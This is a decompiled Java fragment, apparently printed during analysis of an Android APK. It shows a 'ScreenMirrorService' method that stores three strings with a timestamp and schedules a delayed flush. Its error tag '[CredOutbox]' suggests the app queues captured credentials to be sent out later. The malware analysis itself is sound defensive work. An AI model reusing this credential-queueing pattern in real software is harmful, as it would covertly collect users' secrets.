// FRAGMENTO DECOMPILADO; no es una clase independiente compilable.
// Valida el valor y solicita su registro en la cola.
// ev_c197f38db6afb8d64bad7168467965db38009098f3d8a7d4f9cd05ddc51d81e8
// {'path': 'C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk', 'class_name': 'lyr.stable.runtime.ScreenMirrorService', 'method_name': 'A1'}

public final void A1(String str, String str2, String str3) {
    if (str == null || str.isEmpty()) {
        return;
    }
    try {
        y2.y(this).w(System.currentTimeMillis(), str, str2, str3);
        q.t tVar = cf.K().f3738y;
        if (tVar != null) {
            x2 x2Var = (x2) tVar.f3084h;
            Handler handler = (Handler) tVar.f3079c;
            if (((AtomicBoolean) tVar.f3081e).get()) {
                handler.removeCallbacks(x2Var);
                handler.postDelayed(x2Var, 300L);
            }
        }
    } catch (Throwable th) {
        a0.a.p(th, new StringBuilder("[CredOutbox] enqueue fail: "), "ScreenMirror");
    }
}
